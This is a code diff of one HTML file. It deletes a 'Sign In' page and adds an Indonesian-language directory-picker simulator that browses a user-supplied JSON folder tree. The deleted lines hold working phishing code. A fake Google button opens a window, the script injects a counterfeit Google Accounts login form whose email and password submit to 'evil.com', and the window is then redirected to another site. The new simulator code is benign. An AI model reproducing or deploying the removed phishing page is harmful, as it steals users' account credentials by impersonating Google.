@@ -1,213 +1,653 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In</title>
-    <!-- Load Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Directory Picker Simulator - Custom Input</title>
     <style>
-        /* Custom styles for the Inter font and overall body layout */
-        body {
-            font-family: 'Inter', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh; /* Ensure full viewport height */
-            background-color: #f0f2f5; /* Light gray background */
-            margin: 0;
-            padding: 1rem; /* Add some padding for smaller screens */
-            box-sizing: border-box; /* Include padding in element's total width and height */
-        }
-        /* Styling for the custom Google button */
-        .google-button {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: white;
-            color: #3c4043; /* Dark gray text */
-            border: 1px solid #dadce0; /* Light gray border */
-            border-radius: 9999px; /* Fully rounded corners */
-            padding: 0.75rem 1.5rem; /* Vertical and horizontal padding */
-            font-size: 1rem;
-            font-weight: 500; /* Medium font weight */
-            cursor: pointer;
-            transition: background-color 0.2s, box-shadow 0.2s; /* Smooth transitions for hover effects */
-            box-shadow: 0 2px 4px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.08); /* Subtle shadow */
-        }
-        /* Hover effect for the Google button */
-        .google-button:hover {
-            background-color: #f8f9fa; /* Lighter background on hover */
-            box-shadow: 0 3px 6px rgba(0,0,0,0.1), 0 2px 4px rgba(0,0,0,0.12); /* Enhanced shadow on hover */
-        }
-        /* Styling for the Google icon within the button */
-        .google-icon {
-            width: 18px;
-            height: 18px;
-            margin-right: 8px; /* Space between icon and text */
-        }
-    </style>
-</head>
-<body class="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4">
-
-    <!-- Main container for the sign-in card -->
-    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-        <h1 class="text-2xl font-semibold mb-6 text-gray-800">Welcome</h1>
-        <!-- The "Sign in with Google" button -->
-        <button class="google-button" onclick="start()">
-           <img src=https://onymos.com/wp-content/uploads/2020/10/google-signin-button-1024x260.png>
-        </button>
-    </div>
-
-    <script>
-                    const googleLoginPageHtml = `
-                        <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-    <script src="https://cdn.tailwindcss.com"><\/script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background-color: #fff;
-            padding: 2.5rem;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            box-sizing: border-box; /* Ensure padding is included in width */
-        }
-        .input-field {
-            width: 100%;
-            padding: 0.75rem 1rem;
-            margin-bottom: 1.25rem;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 1rem;
+        * {
             box-sizing: border-box;
-            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            margin: 0;
+            padding: 0;
         }
-        .input-field:focus {
-            outline: none;
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 1px #1a73e8;
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            padding: 20px;
         }
-        .btn-primary {
-            background-color: #1a73e8;
-            color: #fff;
-            padding: 0.75rem 1.5rem;
-            border-radius: 4px;
-            font-size: 1rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s ease-in-out;
-            width: auto; /* Allow button to size based on content */
-            min-width: 90px; /* Ensure a minimum width */
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
         }
-        .btn-primary:hover {
-            background-color: #1766d1;
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
-        .link-text {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 0.875rem;
-            transition: color 0.2s ease-in-out;
+        
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
         }
-        .link-text:hover {
-            color: #1766d1;
-            text-decoration: underline;
+        
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 1.1rem;
         }
-        .message-box {
-            background-color: #e6f4ea;
-            color: #1e8449;
-            padding: 0.75rem;
-            border-radius: 4px;
-            margin-bottom: 1rem;
-            text-align: left;
-            font-size: 0.875rem;
-            display: none; /* Hidden by default */
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
         }
-        .message-box.error {
-            background-color: #fce8e6;
-            color: #d93025;
+        
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
         }
-        .flex-between {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        
+        .panel {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .panel h2 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #ecf0f1;
+        }
+        
+        textarea {
             width: 100%;
-            margin-top: 1.5rem;
+            height: 300px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            resize: vertical;
+            margin-bottom: 15px;
         }
-        .text-left {
-            text-align: left;
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
         }
-        .text-right {
-            text-align: right;
+        
+        button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        button:hover {
+            background-color: #2980b9;
+        }
+        
+        button.secondary {
+            background-color: #95a5a6;
+        }
+        
+        button.secondary:hover {
+            background-color: #7f8c8d;
+        }
+        
+        button.success {
+            background-color: #2ecc71;
+        }
+        
+        button.success:hover {
+            background-color: #27ae60;
+        }
+        
+        .result {
+            margin-top: 20px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f8f9fa;
+            min-height: 200px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .file-item {
+            padding: 8px 12px;
+            margin: 5px 0;
+            background: #e9ecef;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .file-item.folder {
+            background: #d1ecf1;
+            font-weight: bold;
+        }
+        
+        .file-icon {
+            font-size: 18px;
+        }
+        
+        .permission-dialog, .custom-dialog {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            z-index: 1000;
+            min-width: 400px;
+            max-width: 90%;
+        }
+        
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+        }
+        
+        .dialog-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .example-format {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+        }
+        
+        .instructions {
+            margin-top: 15px;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+        
+        .directory-path {
+            font-weight: bold;
+            color: #2c3e50;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #ecf0f1;
+            border-radius: 5px;
+        }
+        
+        .empty-state {
+            text-align: center;
+            color: #7f8c8d;
+            padding: 40px 20px;
+        }
+        
+        .file-size {
+            font-size: 0.8rem;
+            color: #7f8c8d;
+            margin-left: auto;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
-        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
-        <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
-
-        <div id="messageBox" class="message-box"></div>
-
-        <form id="loginForm" action="https://evil.com">
-            <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
-            <input type="password" id="password" class="input-field" placeholder="Password" required>
-
-            <div class="text-left mb-6">
-                <a href="#" class="link-text">Forgot password?</a>
+    <div class="container">
+        <header>
+            <h1>Directory Picker Simulator</h1>
+            <p class="subtitle">Simulasikan pemilihan direktori dengan struktur kustom Anda sendiri</p>
+        </header>
+        
+        <div class="main-content">
+            <div class="panel">
+                <h2>Struktur Direktori Kustom</h2>
+                <p>Masukkan struktur direktori Anda dalam format JSON di bawah:</p>
+                
+                <textarea id="directoryStructure" placeholder='Contoh: 
+{
+  "Documents": {
+    "type": "directory",
+    "children": {
+      "Work": {
+        "type": "directory",
+        "children": {
+          "project.docx": { "type": "file", "size": 24576 },
+          "presentation.pptx": { "type": "file", "size": 153600 }
+        }
+      },
+      "resume.pdf": { "type": "file", "size": 10240 }
+    }
+  },
+  "Pictures": {
+    "type": "directory", 
+    "children": {
+      "vacation.jpg": { "type": "file", "size": 3500000 }
+    }
+  }
+}'></textarea>
+                
+                <div class="button-group">
+                    <button onclick="loadExample()" class="secondary">
+                        <span class="file-icon">📋</span> Muat Contoh
+                    </button>
+                    <button onclick="validateAndSaveStructure()" class="success">
+                        <span class="file-icon">💾</span> Simpan Struktur
+                    </button>
+                </div>
+                
+                <div class="instructions">
+                    <p><strong>Format yang valid:</strong></p>
+                    <ul>
+                        <li>Gunakan <code>"type": "directory"</code> untuk folder</li>
+                        <li>Gunakan <code>"type": "file"</code> untuk file</li>
+                        <li>Folder harus memiliki properti <code>"children"</code></li>
+                        <li>File harus memiliki properti <code>"size"</code> (dalam bytes)</li>
+                    </ul>
+                </div>
             </div>
-
-            <p class="text-sm text-gray-600 text-left mb-6">
-                Not your computer? Use a private browsing window to sign in. <a href="#" class="link-text">Learn more</a>
-            </p>
-
-            <div class="flex-between">
-                <a href="#" class="link-text">Create account</a>
-                <button type="submit" class="btn-primary">Next</button>
+            
+            <div class="panel">
+                <h2>Directory Picker</h2>
+                <p>Klik tombol di bawah untuk membuka Directory Picker simulator:</p>
+                
+                <div class="button-group">
+                    <button onclick="showDirectoryPickerSimulator()">
+                        <span class="file-icon">📁</span> Buka Directory Picker
+                    </button>
+                    <button onclick="clearResults()" class="secondary">
+                        <span class="file-icon">🗑️</span> Hapus Hasil
+                    </button>
+                </div>
+                
+                <div class="result" id="result">
+                    <div class="empty-state">
+                        <p>Hasil pemilihan direktori akan ditampilkan di sini</p>
+                    </div>
+                </div>
             </div>
-        </form>
+        </div>
     </div>
 
-</body>
-</html>
-                    `;
-var j='';
-function start(){
-j = window.open(`https://www.google.com/search?q=account.google.com`,`j`)
+    <!-- Permission Dialog -->
+    <div class="overlay" id="overlay"></div>
+    <div class="permission-dialog" id="permissionDialog">
+        <h3>Permintaan Izin Direktori</h3>
+        <p>Situs ini ingin mengakses file dan direktori di perangkat Anda.</p>
+        <div class="dialog-buttons">
+            <button onclick="denyPermission()" class="secondary">Tolak</button>
+            <button onclick="grantPermission()">Izinkan</button>
+        </div>
+    </div>
 
-setTimeout(()=>{
+    <!-- Custom Directory Selection Dialog -->
+    <div class="custom-dialog" id="customDialog">
+        <h3>Pilih Direktori</h3>
+        <p>Pilih direktori dari struktur yang telah Anda buat:</p>
+        <div id="directoryOptions"></div>
+        <div class="dialog-buttons">
+            <button onclick="cancelSelection()" class="secondary">Batal</button>
+        </div>
+    </div>
 
-const intervalId = setInterval(() => {
-  try {
-    j.document.body.innerHTML=googleLoginPageHtml;
-    j.window.location='https://rx23.io/'
-    clearInterval(intervalId);
-  } catch (error) {
-  }
-}, 100);
+    <script>
+        // Struktur default
+        let customFileSystem = {};
+        let selectedDirectory = null;
 
-},1500);
+        // Memuat contoh struktur
+        function loadExample() {
+            const exampleStructure = {
+                "Documents": {
+                    "type": "directory",
+                    "children": {
+                        "Work": {
+                            "type": "directory",
+                            "children": {
+                                "project.docx": { "type": "file", "size": 24576 },
+                                "presentation.pptx": { "type": "file", "size": 153600 },
+                                "Notes": {
+                                    "type": "directory",
+                                    "children": {
+                                        "meeting-notes.txt": { "type": "file", "size": 2048 }
+                                    }
+                                }
+                            }
+                        },
+                        "Personal": {
+                            "type": "directory",
+                            "children": {
+                                "resume.pdf": { "type": "file", "size": 10240 },
+                                "photo.jpg": { "type": "file", "size": 2048000 }
+                            }
+                        },
+                        "readme.txt": { "type": "file", "size": 512 }
+                    }
+                },
+                "Pictures": {
+                    "type": "directory",
+                    "children": {
+                        "vacation.png": { "type": "file", "size": 3500000 },
+                        "family.jpeg": { "type": "file", "size": 2800000 }
+                    }
+                },
+                "Downloads": {
+                    "type": "directory", 
+                    "children": {
+                        "software.zip": { "type": "file", "size": 50000000 },
+                        "ebook.pdf": { "type": "file", "size": 15000000 }
+                    }
+                }
+            };
+            
+            document.getElementById('directoryStructure').value = JSON.stringify(exampleStructure, null, 2);
+        }
 
-}
+        // Validasi dan simpan struktur kustom
+        function validateAndSaveStructure() {
+            const structureInput = document.getElementById('directoryStructure').value;
+            
+            if (!structureInput.trim()) {
+                alert('Masukkan struktur direktori dalam format JSON');
+                return;
+            }
+            
+            try {
+                const parsedStructure = JSON.parse(structureInput);
+                
+                // Validasi struktur
+                if (typeof parsedStructure !== 'object' || Array.isArray(parsedStructure)) {
+                    throw new Error('Struktur harus berupa objek JSON');
+                }
+                
+                // Validasi rekursif
+                function validateNode(node, path) {
+                    if (!node.type) {
+                        throw new Error(`Node ${path} harus memiliki properti "type"`);
+                    }
+                    
+                    if (node.type === 'directory') {
+                        if (!node.children || typeof node.children !== 'object') {
+                            throw new Error(`Direktori ${path} harus memiliki properti "children"`);
+                        }
+                        
+                        for (const [name, child] of Object.entries(node.children)) {
+                            validateNode(child, `${path}/${name}`);
+                        }
+                    } else if (node.type === 'file') {
+                        if (typeof node.size !== 'number') {
+                            throw new Error(`File ${path} harus memiliki properti "size" berupa angka`);
+                        }
+                    } else {
+                        throw new Error(`Tipe tidak valid untuk ${path}: ${node.type}`);
+                    }
+                }
+                
+                for (const [name, node] of Object.entries(parsedStructure)) {
+                    validateNode(node, name);
+                }
+                
+                customFileSystem = parsedStructure;
+                alert('Struktur direktori berhasil disimpan!');
+                
+            } catch (error) {
+                alert(`Error dalam struktur JSON: ${error.message}`);
+            }
+        }
 
+        // Menampilkan directory picker simulator
+        function showDirectoryPickerSimulator() {
+            if (Object.keys(customFileSystem).length === 0) {
+                alert('Silakan buat dan simpan struktur direktori terlebih dahulu');
+                return;
+            }
+            
+            // Tampilkan dialog permintaan izin
+            document.getElementById('permissionDialog').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+
+        // Memberikan izin dan menampilkan pilihan direktori
+        function grantPermission() {
+            hideDialog('permissionDialog');
+            showCustomDirectoryDialog();
+        }
+
+        // Menolak izin
+        function denyPermission() {
+            hideDialog('permissionDialog');
+            document.getElementById('result').innerHTML = 
+                '<div class="empty-state"><p style="color: red;">Izin akses direktori ditolak</p></div>';
+        }
+
+        // Membatalkan pemilihan
+        function cancelSelection() {
+            hideDialog('customDialog');
+        }
+
+        // Menyembunyikan dialog
+        function hideDialog(dialogId) {
+            document.getElementById(dialogId).style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+        // Menampilkan dialog pemilihan direktori kustom
+        function showCustomDirectoryDialog() {
+            const directoryOptions = document.getElementById('directoryOptions');
+            directoryOptions.innerHTML = '';
+            
+            // Tambahkan opsi untuk setiap direktori root
+            for (const [dirName, dirData] of Object.entries(customFileSystem)) {
+                if (dirData.type === 'directory') {
+                    const dirButton = document.createElement('button');
+                    dirButton.textContent = `📁 ${dirName}`;
+                    dirButton.onclick = () => selectDirectory(dirName, dirData);
+                    dirButton.style.width = '100%';
+                    dirButton.style.justifyContent = 'flex-start';
+                    dirButton.style.marginBottom = '10px';
+                    directoryOptions.appendChild(dirButton);
+                }
+            }
+            
+            document.getElementById('customDialog').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+
+        // Memilih direktori
+        function selectDirectory(dirName, directory) {
+            hideDialog('customDialog');
+            selectedDirectory = directory;
+            displayDirectoryContents(dirName, directory);
+        }
+
+        // Menampilkan konten direktori
+        function displayDirectoryContents(dirName, directory) {
+            let html = `<div class="directory-path">📁 ${dirName}</div>`;
+            html += `<p><strong>Jenis:</strong> Direktori</p>`;
+            html += `<h3>Konten Direktori:</h3>`;
+            
+            function listContents(obj, path = '') {
+                let contentHtml = '';
+                for (const [name, item] of Object.entries(obj.children || {})) {
+                    const fullPath = path ? `${path}/${name}` : name;
+                    if (item.type === 'directory') {
+                        contentHtml += `<div class="file-item folder">
+                            <span class="file-icon">📁</span>
+                            <span>${name}/</span>
+                            <span class="file-size">directory</span>
+                        </div>`;
+                    } else {
+                        contentHtml += `<div class="file-item">
+                            <span class="file-icon">📄</span>
+                            <span>${name}</span>
+                            <span class="file-size">${formatFileSize(item.size)}</span>
+                        </div>`;
+                    }
+                }
+                return contentHtml;
+            }
+            
+            const contents = listContents(directory);
+            html += contents || '<p>Direktori kosong</p>';
+            
+            html += `<br><div class="button-group">
+                <button onclick="readDirectoryContents()">Baca Konten Directory</button>
+                <button onclick="simulateFileOperations()" class="secondary">Operasi File Simulasi</button>
+            </div>`;
+            
+            document.getElementById('result').innerHTML = html;
+        }
+
+        // Membaca konten direktori
+        function readDirectoryContents() {
+            if (!selectedDirectory) {
+                alert('Tidak ada direktori yang dipilih');
+                return;
+            }
+            
+            let content = 'Konten direktori:\n\n';
+            
+            function gatherContents(obj, indent = '') {
+                for (const [name, item] of Object.entries(obj.children || {})) {
+                    if (item.type === 'directory') {
+                        content += `${indent}📁 ${name}/\n`;
+                        gatherContents(item, indent + '  ');
+                    } else {
+                        content += `${indent}📄 ${name} (${formatFileSize(item.size)})\n`;
+                    }
+                }
+            }
+            
+            gatherContents(selectedDirectory);
+            
+            document.getElementById('result').innerHTML += 
+                `<pre style="background: #fff; padding: 15px; border-radius: 5px; margin-top: 15px; white-space: pre-wrap;">${content}</pre>`;
+        }
+
+        // Simulasi operasi file
+        function simulateFileOperations() {
+            if (!selectedDirectory) {
+                alert('Tidak ada direktori yang dipilih');
+                return;
+            }
+            
+            let fileCount = 0;
+            let totalSize = 0;
+            
+            function countFiles(obj) {
+                for (const item of Object.values(obj.children || {})) {
+                    if (item.type === 'file') {
+                        fileCount++;
+                        totalSize += item.size;
+                    } else if (item.type === 'directory') {
+                        countFiles(item);
+                    }
+                }
+            }
+            
+            countFiles(selectedDirectory);
+            
+            const operationsHTML = `
+                <div style="margin-top: 20px; padding: 15px; background: #e8f4fd; border-radius: 5px;">
+                    <h4>Hasil Operasi File Simulasi:</h4>
+                    <p><strong>Jumlah file:</strong> ${fileCount}</p>
+                    <p><strong>Total ukuran:</strong> ${formatFileSize(totalSize)}</p>
+                    <p><strong>File terbesar:</strong> ${formatFileSize(findLargestFile(selectedDirectory))}</p>
+                    <p><strong>Ekstensi file:</strong> ${getFileExtensions(selectedDirectory).join(', ')}</p>
+                </div>
+            `;
+            
+            document.getElementById('result').innerHTML += operationsHTML;
+        }
+
+        // Mencari file terbesar
+        function findLargestFile(directory) {
+            let largestSize = 0;
+            
+            function findLargest(obj) {
+                for (const item of Object.values(obj.children || {})) {
+                    if (item.type === 'file' && item.size > largestSize) {
+                        largestSize = item.size;
+                    } else if (item.type === 'directory') {
+                        findLargest(item);
+                    }
+                }
+            }
+            
+            findLargest(directory);
+            return largestSize;
+        }
+
+        // Mendapatkan ekstensi file
+        function getFileExtensions(directory) {
+            const extensions = new Set();
+            
+            function gatherExtensions(obj) {
+                for (const [name, item] of Object.entries(obj.children || {})) {
+                    if (item.type === 'file') {
+                        const ext = name.split('.').pop();
+                        if (ext && ext !== name) {
+                            extensions.add(ext);
+                        }
+                    } else if (item.type === 'directory') {
+                        gatherExtensions(item);
+                    }
+                }
+            }
+            
+            gatherExtensions(directory);
+            return Array.from(extensions);
+        }
+
+        // Memformat ukuran file
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // Menghapus hasil
+        function clearResults() {
+            document.getElementById('result').innerHTML = 
+                '<div class="empty-state"><p>Hasil pemilihan direktori akan ditampilkan di sini</p></div>';
+            selectedDirectory = null;
+        }
+
+        // Muat contoh saat halaman pertama kali dimuat
+        window.onload = loadExample;
     </script>
 </body>
 </html>
